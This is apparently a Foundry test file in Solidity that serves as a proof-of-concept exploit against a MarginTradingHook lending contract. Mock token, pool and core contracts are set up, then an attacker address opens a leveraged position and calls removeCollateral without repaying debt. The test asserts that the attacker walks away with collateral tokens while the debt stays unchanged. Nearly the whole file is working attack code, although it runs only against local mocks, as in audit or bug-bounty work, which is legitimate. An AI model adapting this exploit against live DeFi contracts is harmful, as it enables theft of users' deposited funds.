pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/MarginTradingHook.sol";

contract TestToken {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint public totalSupply;

    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint amount) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Not approved");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        return true;
    }
}


contract MockInitCore {
    uint public posCounter;
    mapping(uint => uint) public collateral;
    mapping(uint => uint) public debt;

    function createPos(uint16, address) external returns (uint posId) {
        posCounter++;
        return posCounter;
    }

    function borrow(address, uint amt, uint posId, address) external returns (uint shares) {
        debt[posId] += amt;
        return amt;
    }

    function mintTo(address, address) external returns (uint shares) {
        return 1;
    }

    function collateralize(uint posId, address) external {
        collateral[posId] = 100;
    }

    function decollateralize(uint posId, address, uint shares, address) external {
        require(collateral[posId] >= shares, "Not enough collateral");
        collateral[posId] -= shares;
    }

    function burnTo(address pool, address to) external returns (uint amt) {
        amt = 50 ether;
        address underlying = MockLendingPool(pool).underlyingToken();
        TestToken(underlying).mint(to, amt);
        return amt;
    }

    function repay(address, uint, uint) external returns (uint) {
        return 0;
    }

    function multicall(bytes[] calldata data) external returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint i = 0; i < data.length; i++) {
            (bool success, bytes memory result) = address(this).delegatecall(data[i]);
            require(success, "Multicall failed");
            results[i] = result;
        }
    }

    function callback(address, uint, bytes calldata) external payable returns (bytes memory) {
        return abi.encode(uint(1));
    }
}


contract MockLendingPool {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function underlyingToken() external view returns (address) {
        return token;
    }

    function toAmtCurrent(uint shares) external pure returns (uint) {
        return shares;
    }
}


contract MockPosManager {
    function getCollAmt(uint, address) external pure returns (uint) {
        return 100;
    }

    function getPosDebtShares(uint, address) external pure returns (uint) {
        return 10;
    }
}


contract MockACM {
    function checkRole(bytes32, address) external pure {}
}


contract MockWNATIVE {
    string public name = "Wrapped Native";
    string public symbol = "WNATIVE";
    uint8 public decimals = 18;
    uint public totalSupply;

    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    function deposit() external payable {
        totalSupply += msg.value;
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw(uint amount) external {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        payable(msg.sender).transfer(amount);
    }

    function transfer(address to, uint amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint amount) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Not approved");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        return true;
    }
}


contract ExploitTest is Test {
    TestToken collateralToken;
    TestToken borrowToken;
    MockLendingPool collPool;
    MockLendingPool borrPool;
    MockInitCore initCore;
    MockPosManager posManager;
    MockACM acm;
    MockWNATIVE wnative;
    MarginTradingHook hook;

    address attacker = address(0xABCD);

    function setUp() public {
        collateralToken = new TestToken("CollateralToken", "COL", 18);
        borrowToken = new TestToken("BorrowToken", "BOR", 18);

        collateralToken.mint(attacker, 1000 ether);
        borrowToken.mint(attacker, 1000 ether);

        collPool = new MockLendingPool(address(collateralToken));
        borrPool = new MockLendingPool(address(borrowToken));

        initCore = new MockInitCore();
        posManager = new MockPosManager();
        acm = new MockACM();
        wnative = new MockWNATIVE();

        hook = new MarginTradingHook(
            address(initCore),
            address(posManager),
            address(wnative),
            address(acm)
        );

        vm.startPrank(attacker);
        hook.setQuoteAsset(address(collateralToken), address(borrowToken), address(collateralToken));
        collateralToken.approve(address(hook), type(uint256).max);
        borrowToken.approve(address(hook), type(uint256).max);
        vm.stopPrank();
    }

    function testExploitRemoveCollateral() public {
        vm.startPrank(attacker);

        // Step 1: Open a leveraged margin position
        (uint posId,,) = hook.openPos(
            1,
            attacker,
            address(collateralToken),
            100 ether,
            address(borrPool),
            10 ether,
            address(collPool),
            "",
            1
        );

        uint initialDebt = initCore.debt(initCore.posCounter());
        uint initialColl = initCore.collateral(initCore.posCounter());

        emit log_named_uint("Initial debt in position", initialDebt);
        emit log_named_uint("Initial collateral shares", initialColl);

        // Step 2: Exploit - call removeCollateral without repaying debt
        hook.removeCollateral(posId, 100, false);

        uint attackerBalance = collateralToken.balanceOf(attacker);
        uint finalDebt = initCore.debt(initCore.posCounter());

        emit log_named_uint("Attacker collateral token balance after exploit", attackerBalance);
        emit log_named_uint("Final debt in position", finalDebt);

        assertEq(finalDebt, 10 ether, "Debt should remain unchanged");
        assertGe(attackerBalance, 50 ether, "Attacker should have received collateral tokens");

        vm.stopPrank();
    }
}
